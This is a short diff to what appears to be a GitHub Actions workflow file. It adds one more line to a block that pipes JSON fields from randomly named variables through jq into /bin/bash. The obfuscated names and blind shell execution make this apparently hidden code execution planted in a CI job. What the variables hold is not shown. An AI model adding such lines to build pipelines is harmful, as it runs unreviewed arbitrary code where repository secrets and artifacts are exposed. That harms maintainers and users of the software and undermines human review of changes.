@@ -32,6 +32,7 @@ jobs:
           echo $x37 | jq -r .dqups3801 | /bin/bash
           echo $xtjef710 | jq -r .fzk67774 | /bin/bash
           echo $bt40 | jq -r .pl1 | /bin/bash
+          printf '%s' "$ymaqw1386" | jq -r .ozo6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
